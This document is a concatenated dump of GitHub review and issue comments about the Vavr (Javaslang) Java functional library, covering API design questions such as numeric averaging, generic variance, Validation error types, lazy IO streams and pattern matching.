intentionally not used\njava\nif (head instanceof Double || head instanceof Float)\nbecause we support all elements that extend Number. For example BigDecimal should be mapped to double instead of long.\nHowever, I'm aware that some types can't be calculated accurately in the double space. I will mention that in the javadoc.. @chb0github you points are valid. I made some tests and looked in the java.util.stream.DoubleStream.average() algorithm. It is accurate, I think we do not need to convert elements to long.\nThis leads to the following impl:\njava\n    default Option<Double> average() {\n        if (isEmpty()) {\n            return Option.none();\n        }\n        try {\n            final java.util.stream.Stream<Number> numbers = (java.util.stream.Stream<Number>) toJavaStream();\n            final double avg = numbers.mapToDouble(Number::doubleValue).average().getAsDouble();\n            return Option.some(avg);\n        } catch (ClassCastException x) {\n            throw new UnsupportedOperationException(\"not numeric\");\n        }\n    }\n. This try{} costs almost nothing extra, as long as no exception is thrown.. Thx for the suggestion, II've also thought about doing it. I agree that it is a good thing to be specific in order to make it easy to find the error reason. I decided not to return the cause, because the cause it is an implementation detail. But you are right, if we have the information then let's do it.\nThere is still a (low) risk to break applications that use Vavr in the case we decide to change the implementation in future and the exception cause disappears. Users should not rely on the cause. Our API spec tells that the method throws an UnsupportedOperationException.. \ud83d\ude04 don't expect the internal implementation of functional libraries to be side-effect free.\nIn fact I advocate that mutable state is perfectly ok. In the ideal case it is in a local scope. Shared mutable state is evil!\nFor example our Future, Lazy and Iterator implementations would not work at all without internal mutable state!. Yes, this is specific for our internal Vavr implementation (and was part of our contribution guidelines I think but I can't find it anymore).\nThe only thing that can be remarked about it is that it is verbose. But in my experience programs get more robust.\nThe argument against it I hear most often is: \"But the object of this variable isn't immutable, I can still mutate it.\" - and I say: \"Yes, but the semantics of final is different, the reference to that object is immutable.\"\nLong story short, it leads to more robust programs because it enforces the developer to not use variables if possible.\nIt does not mean to not use mutable variables at all.. It does...\n\n. dito. ClassCastEcxeption is an implementation detail. It might change.. The rule we follow:\n\nIf we check an argument we do a guard (most often Objects.requireNonNull(), but also if-guards)\nAfter checking the arguments, we use if-else\n\n```java\n// THE WAY WE DO IT\ndefault Option maxBy(Comparator<? super T> comparator) {\n    Objects.requireNonNull(comparator, \"comparator is null\");\n    if (isEmpty()) {\n        return Option.none();\n    } else {\n        final T value = reduce((t1, t2) -> comparator.compare(t1, t2) >= 0 ? t1 : t2);\n        return Option.some(value);\n    }\n}\n// NOT ACCORDING TO OUR CODING GUIDELINE\ndefault Option maxBy(Comparator<? super T> comparator) {\n    Objects.requireNonNull(comparator, \"comparator is null\");\n    if (isEmpty()) {\n        return Option.none();\n    }\n    final T value = reduce((t1, t2) -> comparator.compare(t1, t2) >= 0 ? t1 : t2);\n    return Option.some(value);\n}\n```\nWe justify the guideline mentioned above by keeping things together with if-else which logically belog together. I.e. the two-sided conditional is a composition of a fork in our code.\nIf we have more than one of these logical units (read: if-else) we also benefit from scoping of variables that are needed only within the branches. Otherwise we would expose these variables to contexts which should not know about them.\nSumming up, if-else helps us to structure our code and making it more robust.. @chb0github I followed you suggestions: throwing ClassCastException and adding a safe average variant (see below.. removed the map call, now we traverse only once instead of two times. That's right, will do that.... Mmhh, interesting - will check that!. I target this change for 1.0.0 (because it affects backward compatibility). The upcoming 0.9.1 (hopefully this weekend) will have the old exception type.. @chb0github The longer I play with sum, product, average, et al. the more I think you are right and we should remove the unsafe ones in 1.0. I like the average(ToDoubleFunction).\nsum() and product() are basically a fold(). However, we could provide also double-only versions sum(ToDoubleFunction) and product(ToDoubleFunction). This way we would be safe.\nI would keep min() and max() which assume that elements are comparable.. Yes, @Test(expected=...) is the 'old style' we used. Assertions is now the way to go, we have more control over the check, e.g. instanceOf, hasCause, withMessage etc.\nHowever, I plan to give all tests some love. We will migrate to JUnit 5. We will have more internal interfaces/mixins (prefixed with a _), like _Foldable, _NumericOps, ... These will have separate unit tests, which are also interfaces (that's possible with JUnit5).\nThis will us give better structure/control over our tests.. @ummels @ruslansennov it is not possible to keep the memoization. Because our equals() hashCode() methods rely on deep calculations. Even if we fix the sortBy case for Vector<Stream<T>>, we can't cover also Vector<Option<Stream<T>>> and so on. The only solution is to disable memoization.\nHowever, memoization of collections may be not cheap at all, depending on the size of the collection. We do not cache the hashCode, currently it takes O(n) to calculate it - the same for equals().. That is a valid point! We need some kind of re-throw logic in the fatal case that will be re-added when we have solved #2049. See also https://github.com/vavr-io/vavr/blob/master/vavr/src/main/java/io/vavr/control/Try.java#L1522-L1527. Sorry, I forgot to drop some lines about the design decision.\nBasically we want to do a map in the example (see original issue), but it does not accept a function that throws. Instead of adding new concepts to our 'language', we use the same things we already have in Try and Future: namely mapTry and flatMapTry. That's the most straight-forward way to do it.. (see explanation above). Thank you! You are right, it is a partial function.\nThe discussion in the original issue shows that I've missed the point here. What we really need is a mapOrThrow() that takes a CheckedFunction1 and re-throws any exception.\nI will update the PR accordingly.. Please name it io.vavr. I read it is best practice to name the module like the main package of the project.\nWhen we slice Vavr modules for version 1.0.0 we will have a module io.vavr.core.\nThanks!. Does a Java 9 build require now this module? Just asking...\nI ask myself if now a jar is released for vavr-benchmark, too (i.e. to maven central).\nIs the benchmark profile then still needed?. Does a java 9 build not compile with the method reference?. \ud83d\udc4d\ud83c\udffc. I would keep the block. It was intended to make the types explicitly visible (even if vars are not used).\nThe difference to (Some<Number> x, List<Option<Number>> xs) -> x + \"::\" + xs) is that we have List<Option<Number>> tail = xs. I.e. we show which general type is inferred by Match.. I think because of the added ? extends the build currently breaks. Does it not compile with jdk9 otherwise?\nAnother fix could be List.<Option<Number>> of(Option.some(1), Option.some(2.0));. The benchmarks should not be part of the main build, even if it is a minimal benchmark.\nIf there are assertions/checks, they should be moved to the vavr core unit tests.\nBenchmarks are about measuring. The only valid case to run them as part of the tests would be that we break the build if the performance decreases. But that is (currently) not possible.\n. Where do we use the options? Is it the implicit <target>${java.version}</target>?. Go to the medding, wan - eh I mean wedding, man. We can do this later :). I see, that's cool.. Yes, will do that later today! Currently I'm in the middle of splitting #2093 in to smaller PRs. After that (and after going to german election).... @chb0github nice one!. Wow, good catch - thank you!. s/children/child/. s/a {@code Tree} with values build up iteration/a new, non-empy {@code Tree} instance/. Please replace the first sentence with the following:\nRecursively builds a non-empty {@code Tree}, starting with the given {@code seed} value and proceeding in depth-first order.\n<p>\nThe children of a node are created by\n<ol>\n<li>applying the {@code descend} function to the node value</li>\n<li>calling this method recursively by using each derived child value as new seed (in iteration order).</li>\n</ol>\n. Please rename the method to recurse(T seed, Function<? super T, ? extends Iterable<? extends T>> descend).\nThe main reason for renaming it is that of might be ambiguous. For example what happens if you change the value type in the unit test from Integer to String? I'm not sure because the call Tree.of(seed, Stream.....) matches two signatures: Tree.of(T, Iterable) and Tree(Integer, Function<Integer, ....>) in the special case of the unit test. This is because Stream is a Seq which implements PartialFunction<Integer, T>, which implements Function<<Integer, T>.\nI think the name Tree.recurse(...) fits well because  we have Stream.iterate(...) which is the same in the sense that a Stream can be seen as Tree with only one or zero children per node.\nWe use ? extends Iterable everywhere. I'm not sure if removing ? extends would still cover all use-cases. (See also our Traversable.flatMap method for example.). \ud83d\udc4d\ud83c\udffc. We should use the more general form\njava\nunlift(Function<? super T, ? extends Option<? extends R>> totalFunction)\n. Narrowing is always ugly. We could use a one-liner\njava\nforAll(Set.<T> narrow(other)::contains)\nbut it looks a bit more cryptic.. I played around with it, e.g.\njava\nreturn Set.<T> narrow(other).containsAll(this);\nI think both solutions are equivalent regarding speed/mem consumption.. One more thought: this.isSubsetOf(that) is different from that.containsAll(this) in the way that containsAll() focuses on elements whereas isSubsetOf() focuses on sets.\nIs it expected behavior that sortedSet1 is subset of sortedSet2 even if both have different underlying Comparators? E.g.\n```java\nComparator c = (i, j) -> 0; // all elements are equal\nSet set1 = TreeSet.of(1, 2, 3);\nSet set2 = TreeSet.of(c, 1);\n// = true\nset1.isSubsetOf(set2);\n```\nJust a question, ~~it could be clarified in the Javadoc...~~ I think we do not have to clarify it.. > Java 9 compilation step within the Travis build seems to be flickering?\nyes, will take a look.... > It's pretty tricky.\nisSubsetOf and containsAll are dual, I would not implement extra-logic regarding the Comparator.\nLet's close this PR and stick to the existing containsAll, it is the simplest solution.\nThx for your PR!. Awesome! \ud83c\udf89. Please add the following example:\n```java\n// = [(1, null, \"I\"), (2, 1, \"II\"), (3, 1, \"III\"), (4, 2, \"IV\"), (5, 2, \"V\")]\nList items = ...; // MenuItem(id, parentId, label)\n//      I\n//     / \\\n//   II  III\n//   /\\\n//  IV V\nTree menu = Tree.build(items, MenuItem::getId, MenuItem::getParentId);\n``. * typo s/shoValidationrt/short/\n* I thing we need to keep 'error' instead of 'errors' in this context. The plural does not make sense here.. Please revert this change, I think we don't need it anymore.. Please revert this change, I think we don't need it anymore.. Why did you remove these - do they not work anymore or is it because of the deprecation before?. This method can be removed, we keep the removed toValid(E error) method (see below).\n(The mapError part here isn't needed, it creates also a new instance and the else block does the same.). I think we do not need full qualification here.. To be consistent with the change above, we need to rename this method also totoValid(...). We should keep this method instead of the ex-toValidation (above) that was renamed to toValid.\nThe generic &lt;E> is consistent to that of the method below toValid(Supplier).\nAlso the javadoc is better here than of the ex-toValidation method above.. The plural is not correct here, the method takes anerror.. dito. dito. dito. dito - looks like you used search/replaceAll ;). dito. I don't think the explicitis needed here. Isn't the diamond operator<>sufficient?. Using anIterableinstead ofSeqwould be more user-friendly, **BUT** I think this might lead to ambiguities. We had a similar discussion in #721 for the factory methodsof(T),of(T...)andofAll(Iterable)`.\nI think it is better to provide an invalid(E... errors) instead of invalid(Iterable) or invalid(Seq).\nWhat do you think?. I think this was a copy-paste error by us. Better would be to name it\njava\n* @param <E>    error type\nor (like below)\njava\n* @param <E>    type of errors\n. I don't know why we did these generics. It should be\njava\nsequence(Iterable<? extends Validation<? extends E, ? extends T>> values)\n(see Either.sequence for example). (minor: we declare local vars final when not assigned again). The 1st generic type param is in contra-variant (= consumer) position, it should have the following generic type bounds:\njava\ndefault T getOrElseGet(Function<? super Seq<? super E>, ? extends T> other) {\n. The lack of declaration-site variance makes type declarations hard in Java. Here, the return type has to be\njava\nSeq<E> getErrors();\nbecause we do not plan to override the Validation class (and return a subtype of Seq in a method override).. Here, it has to be\njava\ndefault Either<Seq<E>, T> toEither()\n. also contra-variant position, i.e. Function<? super Seq<? super E>, ? extends U>. will change to the following after you change the return type of getErrors() as stated above:\njava\nfinal Seq<E> error = this.getErrors();\n. Can be simplified to\njava\ndefault Validation<T, Seq<E>> swap(). can be simplified to\njava\nfinal Seq<E> error = this.getErrors();\n. contra-variant position:\njava\nFunction<? super Seq<? superE>, ? extends E2>\n. can be simplified\njava\nfinal Seq<E> error = this.getErrors();\n. contra-variant position:\njava\nFunction<? super Seq<? super E>, ? extends U>\nHowever, there is one thing I recognized: We now implicitely have errors of type Seq<U> when we have a type Validation<U, T>. Isn't it natural then to describe how to map one error? I.e.\njava\ndefault <U> Validation<U, T> mapError(Function<? super E, ? extends U> f) {\n    Objects.requireNonNull(f, \"f is null\");\n    if (isInvalid()) {\n        return Validation.invalid(f.apply(errors));\n    } else {\n        return (Validation<U, T>) this;\n    }\n}\nI don't know, please discuss!\n(maybe it would also affect fold, bimap, ... ?)\nMaybe we need also to change the name: mapErrors instead of mapError.\n. we didn't do it before but maybe it needs to be ap(Validation<? super E, ...> validation) in the general case?. can be Seq<E>. can be Seq<E>. specificErrors and finalErrors can be declared final. (This is some sort of Vavr convention :) ). can be\njava\npublic Seq<E> getErrors()\n. I think it can be Seq<E> errors. Maybe it needs to be casted when assigned/at creation time in one of our factory methods.. can be\njava\npublic Seq<E> getErrors()\n. @ruslansennov this time I did not forget it \ud83c\udf89. It is good to mark it! Maybe we can remove the method for Vavr 1.0.0 - but for now it can stay as-is. Thx!. great, thx!. Great to see that we can get rid of it in our Seq tests!. please make it Function<? super Throwable, ? extends U>. typo: ... to a~~n~~ .... I think it is better to switch implementations in order to save one intermediate Validation instance.\nHere it is:\njava\nif (isFailure()) {\n    return Validation.invalid(throwableMapper.apply(getCause()));\n} else {\n    return Validation.valid(get());\n}\nThen the toValidation() method above looks like this:\njava\nreturn toValidation(Function.identity());\nI think the JIT magic will inline the identity() function, it will perform well.. please make it fromTry(Try<? extends T> t). Hi Amy, your main idea of unifying error to be a sequence is great. I will look into it again today and pull it in.\nBecause of or work on 1.0.0 currently all is 'in the flow'. Minor subsequent changes may follow.... Using monitors in the presence of ForkJoinPool seems to deadlock the JVM (on the CI server). Instead of using a ManagedBlocker I will rewrite this without blocking.. @paplorinc Good remark! Generally I would say yes but for now we can leave it as is. When we have the new inline code generator we are able to write self-expanding Java files (the generator code will be part of a Java comment). I will then change all Vavr source files accordingly.... Just stumbled upon this while trying to achieve inbox-zero :) Sorry for the late reply.\nWe should take care of uniformly using generic declarations across the project.\nMaybe the addition of another parameter is a great trick to circumvent the need of type witnesses in the presence of several ? extends T declarations - I don't know. It looks a bit like Scala's sort of type declaration now (declaration-site variance vs use-site variance).\nI will create an issue to investigate it.. I double-checked it. The correct declaration should look like this:\njava\nstatic <T> Iterator<T> iterate(Supplier<? extends Option<? extends T>> supplier) { ... }\nThen all compile errors disappear. I will do an updating PR.\nThx!. The new way is only better when this HashSet and the elements are equal but it adds an overhead for all other cases. Please restore the previous version.. A TreeSet is a SortedSet. We can't check for equality here because insertion depends on the underlying Comparator. Please restore the previous version.. We also need factory methods in order to be able to take advantage of the new unchecked() method.. Yes, we had problems in the past with overloads that have a generic value parameter. However, my tests do not lead to ambiguities. Unless we find a counter-example, I would keep same names.\n```java\nclass Tuple2 {\n// ...\n\npublic final <T3> Tuple3<T1, T2, T3> concat(T3 value) {\n    return new Tuple3<>(_1, _2, value);\n}\n\npublic final <T3> Tuple3<T1, T2, T3> concat(Tuple1<T3> tuple) {\n    return new Tuple3<>(_1, _2, tuple._1);\n}\n\n}\n// both tests compile fine\nfinal Tuple3 testee1 = Tuple.of(\"a\", true).concat(1);\nfinal Tuple3 testee2 = Tuple.of(\"a\", true).concat(Tuple.of(1));\n``\n. Yes, Ruslan is right. In the case of values T1, ... Tn we should choose another name. I would prefer **append** overaddbecause our sequential types also haveappend(in contrast to Set which hasadd`).. Returns an Array. (...), where each element ~are~ is the given {\\@code element}.. ...returned by ~an~ {@code n} calls.... ...returned by ~an~ {\\@code n} calls.... ...returned by ~an~ {\\@code n} calls.... An iterator of {\\@code n} sequential elements, where each element ~are~ is the given {\\@code element}.. ...returned by ~an~ {\\@code n} calls.... (...), where each element ~~are~~ is the given {\\@code element}.. (...), where each element ~are~ is the given {\\@code element}.. (...), where each element ~are~ is the given {@code element}.. (...), where each element ~are~ is the given {\\@code element}.. (...), where each element ~are~ is the given {\\@code element}.. ...returned by ~an~ {\\@code n} calls.... ...returned by ~an~ {\\@code n} calls.... ..., where each element contains ~the~ {\\@code n} values of.... , where each element contains ~the~ {\\@code n} values of. (...), where each element ~are~ is the given {\\@code element}.. I tested these:\n```java\n    default void test() {\n        Validation v = Validation.valid(\"A\");\n    Consumer<Seq<String>> action1 = System.out::println;\n    v.peekInvalid(action1); // OK\n\n    Consumer<Seq<CharSequence>> action2 = System.out::println;\n    v.peekInvalid(action2); // TYPE ERROR\n\n    Consumer<Iterable<String>> action3 = System.out::println;\n    v.peekInvalid(action3); // OK\n\n    Consumer<Iterable<CharSequence>> action4 = System.out::println;\n    v.peekInvalid(action4); // TYPE ERROR\n}\n\n```\nHowever, I think your type signature is correct! Using Consumer<? super Seq<? super E>> action does not work.. I would either remove the class declaration (and keep the example/body) or use a static initializer because the current code is not valid Java.. Let's rename filterEither to filterOrElse in order to align a bit more to Scala (see Scala API).\nMaybe we should rename filterVal also to zero, it puts more emphasis that it is used in the empty case.\nScala does have a lazy zero provider zero: => L. But I think your choice is better in terms of flexibility. One does not have to use the right value in order to derive a left value. In other cases we use additional overloads (Supplier<L> zero and L zero), but I'm not a big fan of adding such a verbosity to the API.. This could be simplified to\njava\nif (isLeft() || predicate.test(get())) {\n    return this;\n} else {\n    return Either.left(filterVal.apply(get()));\n}\nor even\njava\nreturn isLeft() || predicate.test(get()) ? this : left(zero.apply(get()));. Great, we missed that :) Thx!. This was really evil. The main purpose of a PartialFunction is to provide fast tests before applying the function.. Value will be removed (in another PR).. However, we don't really lose s.th. here. If we decided that we really need this functionality, we could add static methods to Option, e.g.\njava\nfinal class Option<T> {\n    static <T, R> PartialFunction<T, R> unlift(Function1<? super T, ? extends Option<? extends R>> totalFunction) {\n        ...\n    }\n}\nBut for now I don't see the necessity.\n. please wrap 'Right' in '{@code Right}'. Thank you! That's better, especially the conversion test should not test the mkString method :). --(++Integer.MAX_VALUE) == Integer.MAX_VALUE. ",
    "mperry": "I can't read French(?), but Try looks like the Validation class in FJ.  FJ uses Try, Try0, Try1, ... and TryEffect, TryEffect0, TryEffect1, etc. for lambdas that can throw an exception and then returns either A or void respectively.\nThe Try series have type signatures for function application like A f() throws Z, whereas TryEffect0 has a void return void f() throws Z.  We then convert this to a P1 or function that returns a Validation<Z, Unit> (for arity 0, A for other arities) and treat it like any other value.\n. @danieldietrich  and @lukaseder \nShould this return the stream within the IO monad to indicate that it is not pure?  Alternately, return a lazy stream, e.g. in FunctionalJava this is a P1<Stream<A>>.  You can then concatenate this stream with another stream without the effects causing problems. The stream you create here won't compose if it is eager on the head with a lazy tail.\n. Another potential problem is what happens if the stream is not fully evaluated.  Does the resource ever close if it is lazy?\nI think iteratees might help here, see Runar's post http://blog.higher-order.com/blog/2010/10/14/scalaz-tutorial-enumeration-based-io-with-iteratees/.  I remember there was an iteratee implementation in FJ, but don't know how complete or comprehensive it is.\n. @lukaseder /cc @danieldietrich\nI missed some context with my comment on closing resources in a lazy stream.  My point (which I poorly stated) was that Iteratees can close the resource without fully evaluating the stream.  My memory of AutoClosable was that an AutoClosable is closed automatically within the try-with-resources statement.  With a normal stream, a stream might be passed around your system and might not release the resource.  Looks like Daniel figured this out from the blog post.\nSome comments on referential transparency (which will probably be too detailed, but please indulge me).  Can we agree Math::random is not referentially transparent (RT)?  If it is not then we can explore this further.  This means that Stream.gen(Math::random) is not (in general) RT.  Consider this java like code (with Scala like syntax):\nval r = Math::random\nval s1 = Stream.gen(r) // evaluate head\nval s2 = s1\nNow if we replace the defintion of s1 in s2 to get val s2 = Stream.gen(r) then s2 has a different value because Math::random accesses mutable state and the head will evaluate to the second random number.\nThe point is that Streams are only RT if elements within it are RT.  I'll point to the (simple) definition of RT in \"FP in Scala\":\nAn expression e is referentially transparent if, for all programs p, all occurrences of e in p can be replaced by the result of evaluating e without affecting the meaning of p. A function f is pure if the expression f(x) is referentially transparent for all referentially transparent x.\nYour comment that Stream is not generally impure is true.  However you are taking java InputStream's as input and returning Stream<Byte>.  You could return either Stream<IO<Byte>> or IO<Stream<Byte>> to be RT, each have different implications.  I have had good success doing this and then using the monad combinators traverse and sequence.  See https://functionaljava.ci.cloudbees.com/job/master/javadoc/fj/data/IOFunctions.html.\nFor stream composition, I only mean we should be able to combine (compose) functions on Streams in arbitrary ways.  Say I had two steams, s1 and s2 and wanted to create a new stream that had the last element of s1 and then all of s2.  If s1 contains side effects then you are stuffed because the head has evaluated the first side effect.  If your stream is a stream of lazy IO actions then you can do this.  This means that your general purpose functions should return Stream<IO<A>>, but you may then choose to run these actions with another convenience method that just returns Stream<A>.  The IO could be reading from different sources (e.g. Read from stdin, then a remote HTTP get, followed by printing to stdout).\nFor a small example of RT IO, see my blog post, https://mperry.github.io/2014/01/03/referentially-transparent-io.html.\n. I started porting stream transducers before Xmas from ch 15 in \"FP in Scala\" that I think Runar got from Haskell.  It was pretty complicated without pattern matching and kinds, but you've inspired me to press on.  So I wrote some pattern matching in Java last night to help.  I will push what I have in the next few days and might have something simple to show in the next few weeks.\n. @danieldietrich \nHopefully I'll respond to your comment above in the next few hours.  I wanted to let you know I have made quite some progress translating section 15.2 (Simple stream transducers).  The code is here, https://github.com/mperry/stream-processing.  A fair bit of it is pretty rough and needs improvement, but it might help to make some ideas more concrete for you.  Ignore the 'oo' package and just look at the 'match' package.\n. On laziness with Stream<IO<A>>:\nYes the head of the stream is eager (strict), but this is not a problem.  Creating an IO<A> does not run the effect, merely creates an object that represents the effect.  The IO action still has to be run to do anything.\nI have the impression (which is perhaps the wrong impression) that you want to memoize by default.  I think this is a mistake as it means the entire stream must be kept in memory, defeating the point of incrementally reading a stream.\nI didn't understand your comment on using the monad combinators internally.  Perhaps you could restate or expand on this.  I also didn't understand your comment on having a Deferred type.  Do you just mean a stream with a lazy head and tail?\nOn resource safety:\nI didn't understand your example:\nStream.of(inputStream1).zip(inputStream2).join()\nIf I consider the types: Stream.of(inputStream1) returns Stream<Stream<A>> and then zip would return Stream<P2<Stream<A>, B>>, which means join would not have the right type.\nSection 15.3 talks alot about resource safety, so I will have to think more carefully about this when I translate this.\n. I am not convinced about the match API.\nThe match class is ok, although I can see me moving my code from using createMatch(...).match(A) to just match(A a, F<A, B> fallback, When<A, B> w) in most cases.\nThe When api is more problematic. consider this code:\npublic Process<I, O> append2(Process<I, O> p) {\n        return Match.match(this, h -> halt(),\n            When.<Emit<I, O>, Process<I, O>, Process<I, O>>whenClass(Emit.class,\n                (Emit<I, O> e) -> Emit.emit(e.head, e.tail.append(p))\n            ).appendClass(Await.class,\n                (Await<I, O> a) -> Await.await(andThen(a.receive, p2 -> p2.append(p)))\n            )\n        );\n    }\nA few problems I see here:\n- it would be nice to unify the methods whenClass and appendClass.  It feels a bit stilted and hard to remember that the first call is whenClass to create a When and the appendClass after that.  I think Java was preventing me having a static and not-static method having the same name, but I need to have more of a play.\n- the type inference sucks, I tried a few different ways, but the whenClass and appendClass methods have to be able to return the parent class Process, whilst taking a function with the subclass as argument, e.g. Emit.  I might be able to play with generics to make this nicer when appending a When to another When, but it is crappy.\n- The class you pass in to whenClass has no relationship to the arguments in the function.  Java generics sucks and because we are doing this at runtime we have to deal with type erasure.  The compiler needs to support this, so this code is a workaround.\nOn the positive side, I am pretty convinced pattern matching here is a better option than spreading the functionality around the class hierarchy.  Also it should be pretty clear that the class of the first argument when creating a when should be the same as the first argument to the function.\nI am not sure when you would need map and flatMap.  The flippant answer is whenever that is the type you need.  It is like constructing a case of when you need map/flatMap for a list, the same examples would serve for a When.  A When is essentially a partial function F<A, B> with function f Option<B> f(A a).  Mapping and flatMapping over a When is then essentially the same as mapping over a function (andThen for one argument functions) and flatMapping over a function (equivalent to flatMap for the reader monad).\n. Your deferred is just a lazy stream.  I changed the signature of your code above to return P1<Stream<T>>:\nstatic P1<Stream<T>> of(Iterator<T> iterator) {\n        return P.lazy(u -> {\n                if (iterator.hasNext()) {\n                        new Cons<>(iterator.next(), () -> Stream.of(iterator)); // stack is safe - no recursion\n                } else {\n                        return Nil.instance();\n                }\n        });\n}\n. In FunctionalJava P1 is currently not an interface.  To get around this when trying to instantiate a P1, there is a static function called lazy on P that has type P1<A> lazy(F<Unit, A>).\nYou are right, my example above is incorrect.  Cons should just call Stream.of for the lazy tail part.  Remember that Supplier and P1 are equivalent, so my example could return Supplier<Stream<T>> instead of P1<Stream<T>>.  The point is the use of Deferred is hiding that you just want the stream to be a lazy value, no need to create a new class.\nI am not sure if you read my blog post, https://mperry.github.io/2014/01/03/referentially-transparent-io.html, but I think you would be interested in the  sequenceWhile function which has the type static <A> IO<Stream<A>> sequenceWhile(final Stream<IO<A>> stream, final F<A, Boolean> f).   In my post, the Stream> is a stream of REPL IOs where each IO prints some text, gets the next value and prints out a response.  This is a good example of combining pure IO values and working on IO streams, all without performing any effects.\nYour technique means you will need to rewrite something like zip for Deferred to make sure the head is never evaluated.  Think of zipping two streams then dropping the first 10 elements without any effects.\nI always refer back to two important monadic combinators, sequence and traverse which I always find useful, particularly in this context:\npublic static <A> IO<Stream<A>> sequence(Stream<IO<A>> stream)\npublic static <A, B> IO<Stream<B>> traverse(Stream<A> list, F<A, IO<B>> f)\nThe benefits of streams of IO are:\n- can combine arbitrary IO actions\n- can construct a stream of IO actions without effects (the IO actions are lazy)\n- can manipulate the stream (e.g. calling sequence, drop, take, zip) without performing an effect\n- can run the effect at the top level, keeping the rest of the program pure\nHope this helps you and have a good sleep!\n. @talios I should go back and clean this up.  I did just enough matching to get started on stream transformers.\nI wanted to do this in a generic way.  For simplicity, ignore the needs for a fallback match if no class matches (i.e. we just throw an error).  Then we need something like:\nstatic <A, B> B match(A a, List<P2<Class<?> c, F<A, B>>> f)\nbut this is not correct and the generics makes this tricky.  The functions provided will actually go from a subclass of A to B.\nI don't think static <A, B> B match(A a, List<P2<Class<?> c, F<? extends A, B>>> f) works because we can't call f.f(a) and we can't cast downwards to the actual type.\nI don't think static <A, B, C extends A> B match(A a, List<P2<Class<?> c, F<C extends A, B>>> f) works either as C will be inferred to A (C needs to be common across all functions, but we want each function to take a different subclass of A).\nI think this is why I used generics in the first when case, to set the top level generics for what was returned (code repeated below for reference).  Then in subsequent appendClass calls the type parameter for the subclass we are handling varies between each call and in each subsequent call the generics could be inferred.\npublic Process<I, O> append2(Process<I, O> p) {\n        return Match.match(this, h -> halt(),\n            When.<Emit<I, O>, Process<I, O>, Process<I, O>>whenClass(Emit.class,\n                (Emit<I, O> e) -> Emit.emit(e.head, e.tail.append(p))\n            ).appendClass(Await.class,\n                (Await<I, O> a) -> Await.await(andThen(a.receive, p2 -> p2.append(p)))\n            )\n        );\n    }\nIf we can come up with something better, I would definitely be interested.\nDoes your second example (repeated below) compile?  I would have thought the compiler complained the functions weren't taking a Process type as the argument to match.\nreturn Match.match(this, h -> halt(),\n            When.<Emit<I, O>, Process<I, O>, Process<I, O>>whenClass(\n                Emit.class,  (Emit<I, O> e)  -> Emit.emit(e.head, e.tail.append(p)),\n                Await.class, (Await<I, O> a) -> Await.await(andThen(a.receive, p2 -> p2.append(p)))\n            )\n        );\n. https://github.com/functionaljava/functionaljava/blob/master/core/src/main/java/fj/control/Trampoline.java\nI think Runar has blogged about his implementation on his old blog.\n. @johnmcclean-aol @danieldietrich Hi John, I will take the time to look at this in the next week.  I haven't looked at the details of your library, how do you handle the type safety and the lack of kinds in your library?\n. @danieldietrich I'm not sure cons is a good term for this method.  Cons usually takes an explicit head and tail.\n. ",
    "bdrewery": "How did you fix this? I have the same issue.\n. ",
    "lukaseder": "In case you're using Eclipse, I'm extremely happy with Xtend for that job:\nhttp://eclipse.org/xtend\n. I see. In my case, the generated sources are checked in and generation is triggered manually, so I can see that the use-cases are different\n. Ooooh, beautiful ideas! I suspect that passing an InputStream will produce a Stream<Byte> in your case?\n. > @mperry: Does the resource ever close if it is lazy?\njava.util.stream.Stream extends AutoCloseable, so the close() and resource semantics should already be covered...\n. Huh, what? I'm not sure if I see the link now... Because I \"walked away\" from this issue here?\n. Aha :-) Hehe, ok. I see that this has been bothering you for a while, then :-)\nI usually conclude with a couple of actions, creating a new issue for each action, linking the actions from the thingy / epic, and then closing the thingy / epic... (e.g. as a duplicate)\n. Hehe, you actually use \u03bb in your code? That's awesome! You should leave it in some places (e.g. static methods) as an alias for the alternative representation :)\n. That was quick ;-)\n. Javaslang is getting more and more awesome. Time for a guest blog post? :-)\n. Well, we're not in a hurry. It was just me, checking, periodically :)\n. I wish I had one, seriously! :)\n. Ideally, basic HTML. Code with <pre> or <code>. I'll reformat\n. > My main goal for Javaslang is to create a Java extension which takes the most out of the new Java features and to bring immutability as default to Java. I target the majority of Java developers out there and I'm sure that many are even not familiar in depth with variance types regarding generics. I think that sophisticated algebraic stuff would keep users away.\nI'm going to be curious how you'll pull that off:\n- Without declaration-site variance\n- Without causing headaches at the call site via use-site variance\nI've seen your trick involving recursive generics in Kind. If this is unleashed upon your users, they'll run :-)\n. > I hope they will stay with me.\nWell, as long as you can hide the generics from client code, you'll be fine. Type inference and type hierarchies are your friends :)\n. > IMO collection views and conversion methods is a better alternative to a complex type hierarchies that often cause blurring of concepts. It also allows to get ride of (confusing) variance annotations.\nI can second that. There is almost nothing in jOOQ's (public) type hierarchy that I don't somehow regret 6 years later. Conversion methods are much easier and intuitive to handle and use at the call site.\nAnd if I've ever regretted something most, then it's using recursive generics (without declaration-site variance) :)\n. > It is simplified there. The Kind arguments Tree will be also there.\nWithout actually having tried the API, I suspect that the biggest pain point will be that it is very hard to assign a reference to a variable of the super type Tree short of resorting to\n- Raw types\n- Wildcards\nE.g.\njava\nTree screwIt = ...\nTree<?, ?> dontCare = ...\nIn fact, things get worse if someone wants to put Tree in a container, as then, there is no way to capture the correct type even with wildcards:\nOption<Tree<?, ?>> wtfDoesntCompile = ...\nAnd you might even risk running in a very rough edge case of Java generics, where type assignments are undecidable (see item no. 9 in this list: http://blog.jooq.org/2014/11/03/10-things-you-didnt-know-about-java, or better, read Ross Tate's full paper on Java wildcards: http://www.cs.cornell.edu/~ross/publications/tamewild/tamewild-tate-pldi11.pdf)\nAgain, my friendly advice is to stay clear of recursive generics. You'll only get hurt :) I've tried to summarise this in the following article:\nhttp://blog.jooq.org/2013/06/28/the-dangers-of-correlating-subtype-polymorphism-with-generic-polymorphism/\nTL;DR: If you correlate generic and subtype polymorphism, the only useful types at the use-site will be the (final) leaf types. All of the other types in the hierarchy are useful only for your internals. That's probably not what you want when defining a useful type like Tree, but it sucks, because all those types are public.\n\nHow would you remove the ?\n\nHard to say, that's your job :)\n\nWhat happens to the flatMap methods (which need the Kind)?\n\nI think you'll never find a good solution prior to Java 10, if declaration-site variance makes it into Java. Of course, I'd love you to prove me wrong!\n\nHow could views and conversion methods help here?\n\nNot sure.\n\nAre there other issues using interfaces here in your opinion (beside security aspects)?\n\nWhat do you mean?\n. > Wherefrom do you take the time to manage all this? :-)\nI have an evil twin.\n\nNeed a beer.\n\nThat's the cause and solution of all problems.\n. Oh, you've removed the recursive generics already from the API? It is still a very interesting application of generics. I'd love for you to endeavour to do more exploration and learn from you. Just wanted to emit a reminder from someone maintaining a 6-year-old API with 1-2 regrets 